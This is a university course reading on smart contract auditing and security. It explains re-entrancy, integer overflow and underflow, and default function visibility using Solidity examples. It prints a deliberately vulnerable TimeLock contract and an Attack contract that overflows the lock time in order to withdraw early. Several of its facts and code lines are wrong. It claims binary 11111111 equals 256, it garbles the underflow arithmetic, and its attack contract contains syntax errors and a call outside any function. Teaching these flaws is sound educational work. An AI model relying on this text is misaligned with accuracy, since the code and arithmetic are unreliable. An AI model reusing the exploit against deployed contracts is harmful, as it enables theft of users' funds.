## Main Contents

1. [Smart Contract](#smart-contract)
2. [Auditing](#auditing)
3. [Security](#security)
4. [Getting Started](#getting-started)

## Smart Contract

\[[← See all readings](https://github.com/COS30049/cos30049_backend/tree/main/readings/README.md)\]

>- essential to many blockchain-based ecosystems, especially application-focused blockchains like `Ethereum`
>- characteristics: autonomous, decentralised, transparent and immutable (irreversible and unmodifiable once deployed)

### Use cases

- Digital Identity
- Cross Border Payments
- Loans and Mortgages
- Financial Data Recording
- Supply Chain Management
- Insurance

## Auditing

\[[back to top ↑](#main-contents)\] \[[← See all readings](https://github.com/COS30049/cos30049_backend/tree/main/readings/README.md)\]

 **It’s essential to perform smart contract audit**
>- Most smart contract security measures take place during the development process.
>- Unlike traditional systems, smart contracts are **nearly impossible to patch once deployed**.
>- Once you write the smart contract to the blockchain, **it is impossible to change the code**.

### Scope

>The process focuses on **scrutiny of the code** used for **underwriting the T&C** in the smart contract
  => helps **identify the vulnerabilities** and bugs before the deployment of smart contracts

### Benefits 

- Better optimization of the code 
- Improved performance of smart contracts 
- Enhanced security of wallets 
- Security against hacking attacks

### Auditors' Responsibilities

\[[back to top ↑](#main-contents)\]

1. **Collecting Code Specifications**
   >The **evaluation of project documentation** could help in developing a **comprehensive understanding** of the project.
   
2. **Assessment of Code for Vulnerabilities**
> Auditors have to check the smart contract code **line by line** and **compare it with a list of common vulnerabilities** expected in smart contract code.

3. **Testing**
>Auditors can **implement unit testing or integration testing**, depending on the scale of assessment, which helps in the **precise identification of code errors and bugs**.

4. **Reporting**
>- Auditors must work on developing a **detailed report for providing specifications** of the assessment. 
>- Auditors have to create a **vulnerability report** before publishing the final audit report.

### How to Become a Smart Contract Security Auditor

See **[slides](https://swinburne.instructure.com/courses/52786/files/27022396) | [⭳](https://swinburne.instructure.com/courses/52786/files/27022396/download?download_frd=1)** (p.15 - 17)

## Security

\[[back to top ↑](#main-contents)\] \[[← See all readings](https://github.com/COS30049/cos30049_backend/tree/main/readings/README.md)\]

> **Security and consistency are critical** due to 
> - smart contracts' authority to **allocate high-value resources** between complicated systems
> - characteristic of smart contract, **autonomous**

### Common Security Flaws

- `Re-entrancy`: Allows attackers to **withdraw balances multiple times** before their balance is set to 0.
- `Over/Under Flows`: Allows attackers to create **unexpected logic flows**. \[[[#Integer Overflow|↓]]\]
- `Frontrunning`: Bad actors can buy large sums of tokens in response to the large transactions collected into blocks and added to a ledger.
- `Incorrect calculations`: Incorrect decimal handling and fee calculations can result in the loss of funds or funds being locked indefinitely.

### Integer Overflow

\[[back to top ↑](#main-contents)\]

>When a single numerical computation is performed, the output **exceeds the maximum** that a register or memory can store or represent.

- In `Solidity`, `uint8` is used to store `unsigned integers` which are **8 bits long**. Therefore, in binary it can hold value ranging from 
   ```
   00000000 ~ 11111111
   ```
   which in decimal are 0, 255 respectively.

- When `uint8` type is used to compute `255 + 1`, which is compiled to:
   ```
   11111111 + 00000001
   ``` 
   The sum of these binary values will be `00000000` or 0 in decimal. However the evaluation is expected to be 256, **9 bits long in binary**, is expected as the sum of 255 and 1. This is an **integer overflow** because, simply, the calculation evaluates to a value that is **greater than the maximum value** `uint8` can store, 255.

**Contract time table**: allows users to deposit funds but requires a minimum wait of 1 week to withdraw. Additionally, the lock time can be increased by calling `increaseLockTime()`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
	mapping(address => uint) public balances;
	mapping(addrss => uint) public lockTime;
	
	function deposit() external payable {
		balances[msg.sender] += msg.value;
		lockTime[msg.sender] = block.timestamp + 1 weeks; // line of issue
	}
	
	function increaseLockTime(uint _secondsToIncrease) public {
		lockTime[msg.sender] += _secondsToIncrease;
	}
	
	function withdraw() public {
		require(balances[msg.sender] > 0, "Insufficient funds");
		require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
		
		uint amount = balances[msg.sender];
		balances[msg.sender] = 0;
		
		(bool sent, ) = msg.sender.call{value: amount}("");
		require(sent, "Failed to send Ether");
	} 
}
```
>⚠ **Issue**
>
>- `uint` or `uint256` can hold values with the length of 256 bits.
>- Initially, `lockTime > 1 weeks`; however, on the "line of issue", the `lockTime` may exceed the maximum number which can be represented by 256-bit string (decimal: 0 ~ 2^256-1).
>- As a result, the contract then fails to maintaining the waiting time.

### Integer Underflow

\[[back to top ↑](#main-contents)\]

>Underflow occurs when the computation result is **less than the minimum capacity** of the register or memory to store or represent.

- When calculating 0 - 1, the machine will understands
   ```
   00000000 - 11111111
   ```
   This subtraction is evaluated to `11111111` or 256 in decimal; however, -1 is expected. This is an **integer underflow** because, simply, the calculation evaluates to a value that is **less than the minimum value** `uint8` can store, 0.

```solidity
contract Attack {
	TimeLock timeLock;
	
	constructor(TimeLock _timeLock) {
		timeLock = TimeLock(_timeLock);
	}
	
	fallback() external payable {}
	
	function attack() public payable {
		timeLock.deposit{value: msg.value}();
		
		timeLock.increaseLockTime(
			// This calculation may underflow
			type(uint).max + 1 - timeLock.lockTime(address(this))
		);
	}
	timeLock.withdraw();
}
```

### Function Default Visibility

\[[back to top ↑](#main-contents)\]

See [Lecture 5, function visibility specifiers](https://github.com/COS30049/cos30049_backend/blob/main/readings/src/%5BSOL%5D%20Fundamentals.md#function).

- When the visibility is not specified, the **default visibility of a function is `public`**. 
- Public function can be accessed **by all parties**. This can lead to a vulnerability if a developer **forgot to set the visibility** and a malicious user is able to make unauthorized or unintended state changes.


```solidity
contract RandomContract  {
	function nFunction() {
		// perform a task
	}
}
```
<pre>
        ▲  
        |
   ┌────┴─────┐
   |  Attack  |
   └────┬─────┘
        |
        |
</pre> 
```solidity
interface IRandomContract {
	function nFunction();
}

contract Attack {
	function functionIsExternalCall(address addr) external {
		IRandomContract(addr).nFunction)();
	}
	
}
```

## Getting Started

\[[back to top ↑](#main-contents)\] \[[← See all readings](https://github.com/COS30049/cos30049_backend/tree/main/readings/README.md)\]

| Source | Link |
| -------- | ----- |
|`Ethereum Docs`| [Ethereum Developer Resources](https://ethereum.org/en/developers/)|
|`solidityidity Docs`| [Introduction to Smart Contracts — Solidity 0.8.22 documentation](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html)|
